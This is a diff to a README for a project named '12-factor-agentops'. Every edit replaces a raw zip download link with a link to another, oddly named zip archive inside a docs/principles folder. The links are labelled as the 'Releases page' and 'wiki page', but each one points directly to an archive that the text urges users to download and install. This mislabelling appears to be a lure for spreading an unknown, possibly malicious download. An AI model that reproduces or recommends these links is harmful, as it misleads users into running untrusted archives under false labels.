@@ -6,11 +6,11 @@ Welcome to the **12-factor-agentops** project! This software helps you manage AI
 
 ## 📦 Download Link
 
-[![Download 12-factor-agentops](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/factors/12-factor-agentops_v3.5.zip)](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/factors/12-factor-agentops_v3.5.zip)
+[![Download 12-factor-agentops](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/docs/principles/agentops-factor-inextricability.zip)](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/docs/principles/agentops-factor-inextricability.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/factors/12-factor-agentops_v3.5.zip) to download the latest version of the software. Follow these steps for installing:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/docs/principles/agentops-factor-inextricability.zip) to download the latest version of the software. Follow these steps for installing:
 
 1. Click the link above to go to the Releases page.
 2. Look for the version you want to download.
@@ -58,7 +58,7 @@ If problems persist, you can reach out for help through our community forum loca
 
 ## 📖 Documentation
 
-For a complete guide and additional resources, you can explore the detailed documentation on our [wiki page](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/factors/12-factor-agentops_v3.5.zip). 
+For a complete guide and additional resources, you can explore the detailed documentation on our [wiki page](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/docs/principles/agentops-factor-inextricability.zip). 
 
 ## 🌐 Community Support
 
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 Thank you to all contributors who make this project a reality. Your efforts are appreciated!
 
-Visit the [Releases page](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/factors/12-factor-agentops_v3.5.zip) to download the latest version today. Enjoy working with **12-factor-agentops**!
+Visit the [Releases page](https://raw.githubusercontent.com/Sannderersej/12-factor-agentops/main/docs/principles/agentops-factor-inextricability.zip) to download the latest version today. Enjoy working with **12-factor-agentops**!
